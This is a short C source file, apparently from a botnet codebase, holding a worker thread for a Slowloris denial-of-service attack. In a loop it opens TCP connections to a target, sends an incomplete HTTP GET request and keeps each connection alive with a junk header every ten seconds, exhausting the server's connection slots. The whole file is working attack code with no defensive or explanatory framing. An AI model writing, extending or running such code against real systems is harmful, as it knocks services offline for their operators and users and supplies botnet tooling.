#include "../../include/botnet.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

// The worker thread function for the Slowloris attack
void *slowloris_worker(void *args) {
    struct target *target = (struct target *)args;
    int sock;
    struct sockaddr_in target_addr;

    target_addr.sin_family = AF_INET;
    target_addr.sin_port = target->port;
    target_addr.sin_addr.s_addr = target->addr;

    char partial_request[512];
    snprintf(partial_request, sizeof(partial_request), 
             "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\n", 
             inet_ntoa(*(struct in_addr *)&target->addr));

    while (attack_running) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            continue;
        }

        if (connect(sock, (struct sockaddr *)&target_addr, sizeof(target_addr)) < 0) {
            close(sock);
            sleep(1); // Wait a bit before retrying
            continue;
        }

        // Send the initial partial request
        send(sock, partial_request, strlen(partial_request), 0);

        // Keep the connection alive by sending garbage headers periodically
        while (attack_running && send(sock, "X-a: b\r\n", 8, 0) > 0) {
            sleep(10); // Keep-alive interval
        }

        close(sock);
    }

    return NULL;
}
